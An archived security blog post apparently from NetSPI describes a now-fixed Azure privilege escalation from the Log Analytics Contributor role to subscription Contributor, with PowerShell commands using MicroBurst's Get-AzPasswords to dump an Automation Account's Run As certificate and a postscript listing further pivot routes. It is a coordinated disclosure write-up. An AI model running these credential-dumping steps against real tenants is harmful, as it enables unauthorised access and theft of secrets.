---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-09-13_escalating-azure-privileges-with-the-log-analytics-contributor-role.md
original_filename: 2021-09-13_escalating-azure-privileges-with-the-log-analytics-contributor-role.md
title: Escalating Azure Privileges with the Log Analytics Contributor Role
category: documents
detected_topics:
- access-control
- cloud-security
- api-security
- command-injection
- automation-abuse
- business-logic
tags:
- imported
- documents
- access-control
- cloud-security
- api-security
- command-injection
- automation-abuse
- business-logic
language: en
raw_sha256: d9888c61e06094547bbb011700738f13685d0d9e98c8a7e2787e0c6f014f8b28
text_sha256: f1c6848ce28783e1833421c2fedecc1e2f38fba648575b10b8657f4d8f6b6349
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: false
---

# Escalating Azure Privileges with the Log Analytics Contributor Role

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-09-13_escalating-azure-privileges-with-the-log-analytics-contributor-role.md
- Source Type: markdown
- Detected Topics: access-control, cloud-security, api-security, command-injection, automation-abuse, business-logic
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: False
- Raw SHA256: `d9888c61e06094547bbb011700738f13685d0d9e98c8a7e2787e0c6f014f8b28`
- Text SHA256: `f1c6848ce28783e1833421c2fedecc1e2f38fba648575b10b8657f4d8f6b6349`


## Content

---
title: "Escalating Azure Privileges with the Log Analytics Contributor Role"
page_title: "Escalating Azure Privileges with the Log Analytics | NetSPI blog"
url: "https://www.netspi.com/blog/technical/cloud-penetration-testing/escalating-azure-privileges-with-the-log-analystics-contributor-role/"
final_url: "https://www.netspi.com/blog/technical-blog/cloud-penetration-testing/escalating-azure-privileges-with-the-log-analystics-contributor-role/"
authors: ["Karl Fosaaen (@kfosaaen)"]
programs: ["Microsoft"]
bugs: ["Logic flaw"]
publication_date: "2021-09-13"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3321
---

[Technical](/blog/technical-blog/#post-container) / Cloud Pentesting 

# Escalating Azure Privileges with the Log Analytics Contributor Role

September 13, 2021

### [Karl Fosaaen](/authors/karl-fosaaen/)

  * [](https://www.facebook.com/sharer/sharer.php?u=https://www.netspi.com/blog/technical-blog/cloud-pentesting/escalating-azure-privileges-with-the-log-analystics-contributor-role/)
  * [](https://twitter.com/intent/tweet?text=Escalating Azure Privileges with the Log Analytics Contributor Role&url=https://www.netspi.com/blog/technical-blog/cloud-pentesting/escalating-azure-privileges-with-the-log-analystics-contributor-role/)
  * [](https://www.linkedin.com/shareArticle?mini=true&url=https://www.netspi.com/blog/technical-blog/cloud-pentesting/escalating-azure-privileges-with-the-log-analystics-contributor-role/&title=Escalating Azure Privileges with the Log Analytics Contributor Role)

![Escalating Azure Privileges with the Log Analytics Contributor Role](https://www.netspi.com/wp-content/uploads/2024/03/Blog-Feature-Images-07.webp)

**TL;DR** – This issue has already been fixed, but it was a fairly minor privilege escalation that allowed an Azure AD user to escalate from the Log Analytics Contributor role to a full Subscription Contributor role.

The [Log Analytics Contributor Role](https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#log-analytics-contributor) is intended to be used for reading monitoring data and editing monitoring settings. These rights also include the ability to run extensions on Virtual Machines, read deployment templates, and access keys for Storage accounts.

Based off the role’s previous rights on the Automation Account service (Microsoft.Automation/automationAccounts/*), the role could have been used to escalate privileges to the Subscription Contributor role by modifying existing Automation Accounts that are configured with a Run As account. This issue was reported to Microsoft in 2020 and has since been remediated.

### Escalating Azure Permissions

Automation Account Run As accounts are initially configured with Contributor rights on the subscription. Because of this, an attacker with access to the Log Analytics Contributor role could create a new runbook in an existing Automation Account and execute code from the runbook as a Contributor on the subscription.

These Contributor rights would have allowed the attacker to create new resources on the subscription and modify existing resources. This includes Key Vault resources, where the attacker could add their account to the access policies for the vault, granting themselves access to the keys and secrets stored in the vault.

Finally, by exporting the Run As certificate from the Automation Account, an attacker would be able to create a persistent Az (CLI or PowerShell module) login as a subscription Contributor (the Run As account).

Since this issue has already been remediated, we will show how we went about explaining the issue in our [Microsoft Security Response Center (MSRC)](https://www.microsoft.com/en-us/msrc) submission.

### Attack Walkthrough

Using an account with the Owner role applied to the subscription (kfosaaen), we created a new Automation Account (LAC-Contributor) with the “Create Azure Run As account” option set to “Yes”. We need to be an Owner on the subscription to create this account, as contributors do not have rights to add the Run As account.

![Add Automation Account](https://www.netspi.com/wp-content/uploads/2020/11/addAA.png)

Note that the Run As account (LAC-Contributor_a62K0LQrxnYHr0zZu/JL3kFq0qTKCdv5VUEfXrPYCcM=) was added to the Azure tenant and is now listed in the subscription IAM tab as a Contributor.

![Access Control](https://www.netspi.com/wp-content/uploads/2020/11/kfosaaen.jpg)

In the subscription IAM tab, we assigned the “Log Analytics Contributor” role to an Azure Active Directory user (LogAnalyticsContributor) with no other roles or permissions assigned to the user at the tenant level.

![Role added](https://www.netspi.com/wp-content/uploads/2020/11/roleAdded.png)

On a system with the Az PowerShell module installed, we opened a PowerShell console and logged in to the subscription with the Log Analytics Contributor user and the Connect-AzAccount function.
  
  
  PS C:temp> Connect-AzAccount
   
  Account SubscriptionName TenantId Environment
  ------- ---------------- -------- -----------
  LogAnalyticsContributor kfosaaen 6[REDACTED]2 AzureCloud

Next, we downloaded the [MicroBurst tools](https://github.com/Netspi/Microburst) and imported the module into the PowerShell session.
  
  
  PS C:temp> import-module C:tempMicroBurstMicroBurst.psm1
  Imported AzureAD MicroBurst functions
  Imported MSOnline MicroBurst functions
  Imported Misc MicroBurst functions
  Imported Azure REST API MicroBurst functions

Using the Get-AZPasswords function in MicroBurst, we collected the Automation Account credentials. This function created a new runbook (iEhLnPSpuysHOZU) in the existing Automation Account that exported the Run As account certificate for the Automation Account.
  
  
  PS C:temp> Get-AzPasswords -Verbose 
  VERBOSE: Logged In as LogAnalyticsContributor@[REDACTED]
  VERBOSE: Getting List of Azure Automation Accounts...
  VERBOSE: Getting the RunAs certificate for LAC-Contributor using the iEhLnPSpuysHOZU.ps1 Runbook
  VERBOSE: Waiting for the automation job to complete
  VERBOSE: Run AuthenticateAs-LAC-Contributor-AzureRunAsConnection.ps1 (as a local admin) to import the cert and login as the Automation Connection account
  VERBOSE: Removing iEhLnPSpuysHOZU runbook from LAC-Contributor Automation Account
  VERBOSE: Password Dumping Activities Have Completed

We then used the MicroBurst created script (AuthenticateAs-LAC-Contributor-AzureRunAsConnection.ps1) to authenticate to the Az PowerShell module as the Run As account for the Automation Account. As we can see in the output below, the account we authenticated as (Client ID – d0c0fac3-13d0-4884-ad72-f7b5439c1271) is the “LAC-Contributor_a62K0LQrxnYHr0zZu/JL3kFq0qTKCdv5VUEfXrPYCcM=” account and it has the Contributor role on the subscription.
  
  
  PS C:temp> .AuthenticateAs-LAC-Contributor-AzureRunAsConnection.ps1
  PSParentPath: Microsoft.PowerShell.SecurityCertificate::LocalMachineMy
  Thumbprint Subject
  ---------- -------
  A0EA38508EEDB78A68B9B0319ED7A311605FF6BB DC=LAC-Contributor_test_7a[REDACTED]b5
  Environments : {[AzureChinaCloud, AzureChinaCloud], [AzureCloud, AzureCloud], [AzureGermanCloud, AzureGermanCloud],
  [AzureUSGovernment, AzureUSGovernment]}
  Context : Microsoft.Azure.Commands.Profile.Models.Core.PSAzureContext
  
  PS C:temp> Get-AzContext | select Account,Tenant
  Account Subscription
  ------- ------
  d0c0fac3-13d0-4884-ad72-f7b5439c1271 7a[REDACTED]b5
  PS C:temp> Get-AzRoleAssignment -ObjectId bc9d5b08-b412-4fb1-a71e-a39036fd2b3b
  RoleAssignmentId : /subscriptions/7a[REDACTED]b5/providers/Microsoft.Authorization/roleAssignments/0eb7b73b-39e0-44f5-89fa-d88efc5fe352
  Scope : /subscriptions/7a[REDACTED]b5
  DisplayName : LAC-Contributor_a62K0LQrxnYHr0zZu/JL3kFq0qTKCdv5VUEfXrPYCcM=
  SignInName :
  RoleDefinitionName : Contributor
  RoleDefinitionId : b24988ac-6180-42a0-ab88-20f7382dd24c
  ObjectId : bc9d5b08-b412-4fb1-a71e-a39036fd2b3b
  ObjectType : ServicePrincipal
  CanDelegate : False
  Description :
  ConditionVersion :
  Condition :

![LAC Contributor](https://www.netspi.com/wp-content/uploads/2020/11/appReg.png)

### MSRC Submission Timeline

Microsoft was great to work with on the submission and they were quick to respond to the issue. They have since removed the Automation Accounts permissions from the affected role and updated documentation to reflect the issue.

![Custom Azure Automation Contributor Role](https://www.netspi.com/wp-content/uploads/Custom-Azure-Automation-Contributor-Role.png)

Here’s a general timeline of the MSRC reporting process:

  * NetSPI initially reports the issue to Microsoft – 10/15/20
  * MSRC Case 61630 created – 10/19/20
  * Follow up email sent to MSRC – 12/10/20
  * MSRC confirms the behavior is a vulnerability and should be fixed – 12/11/20
  * Multiple back and forth emails to determine disclosure timelines – March-July 2021
  * Microsoft [updates the role documentation](https://docs.microsoft.com/en-us/azure/automation/automation-role-based-access-control?branch=pr-en-us-162400#custom-azure-automation-contributor-role) to address the issue – July 2021
  * NetSPI does initial public disclosure via [DEF CON Cloud Village talk](https://www.youtube.com/watch?v=CUTwkuiRgqg) – August 2021
  * Microsoft removes Automation Account permissions from the LAC Role – August 2021

### Postscript

While this blog doesn’t address how to escalate up from the Log Analytics Contributor role, there are many ways to pivot from the role. Here are some of its other permissions: 
  
  
  "actions": [
  "*/read",
  "Microsoft.ClassicCompute/virtualMachines/extensions/*",
  "Microsoft.ClassicStorage/storageAccounts/listKeys/action",
  "Microsoft.Compute/virtualMachines/extensions/*",
  "Microsoft.HybridCompute/machines/extensions/write",
  "Microsoft.Insights/alertRules/*",
  "Microsoft.Insights/diagnosticSettings/*",
  "Microsoft.OperationalInsights/*",
  "Microsoft.OperationsManagement/*",
  "Microsoft.Resources/deployments/*",
  "Microsoft.Resources/subscriptions/resourcegroups/deployments/*",
  "Microsoft.Storage/storageAccounts/listKeys/action",
  "Microsoft.Support/*"
  ]

More specifically, this role can pivot to Virtual Machines via [Custom Script Extensions](https://www.netspi.com/blog/technical/cloud-penetration-testing/attacking-azure-with-custom-script-extensions/) and [list out Storage Account keys](https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/). You may be able to make use of a [Managed Identity on a VM](https://www.netspi.com/blog/technical/cloud-penetration-testing/azure-privilege-escalation-using-managed-identities/), or find something interesting in the Storage Account.

Looking for an [Azure pentesting](https://www.netspi.com/security-testing/azure-penetration-testing) partner? Consider NetSPI.

## Explore More Blog Posts

[ ![](https://www.netspi.com/wp-content/uploads/2024/07/072924_TECH_GCPwn_Feature.webp) Cloud Pentesting Bypassing Microsoft Entra Conditional Access Policies via Nested App Authentication  June 22, 2026 Discover how attackers bypassed Microsoft Entra Conditional Access Policies using Nested App Authentication (NAA) flows in this technical vulnerability breakdown. Learn More ](https://www.netspi.com/blog/technical-blog/cloud-pentesting/bypassing-microsoft-entra-conditional-access-policies-via-nested-app-authentication/)[ ![](https://www.netspi.com/wp-content/uploads/2026/06/Feature-Image_Red-Plaid.jpg) Social Engineering I’m Just Asking Questions: Social Engineering as a Reporter  June 17, 2026 Dive into this real-world social engineering assessment where a fake anonymous tip and an adversary-in-the-middle framework tested the limits of an organization's security policies. Learn More ](https://www.netspi.com/blog/technical-blog/social-engineering/im-just-asking-questions-social-engineering-as-a-reporter/)[ ![](https://www.netspi.com/wp-content/uploads/2025/12/TB-Design-6_Feature-Image.png) CISO Perspectives Beyond the Hype: What Regulated Industries Need to Know Before Trusting AI Security Tooling  June 16, 2026 AI security tools can build an attack, but enterprise security teams in regulated industries need consistency, auditability, and predictable costs before they can trust one. Learn why the surrounding infrastructure is where most AI security vendors are still falling short. Learn More ](https://www.netspi.com/blog/executive-blog/ciso-perspectives/beyond-the-hype-what-regulated-industries-need-to-know-before-trusting-ai-security-tooling/)
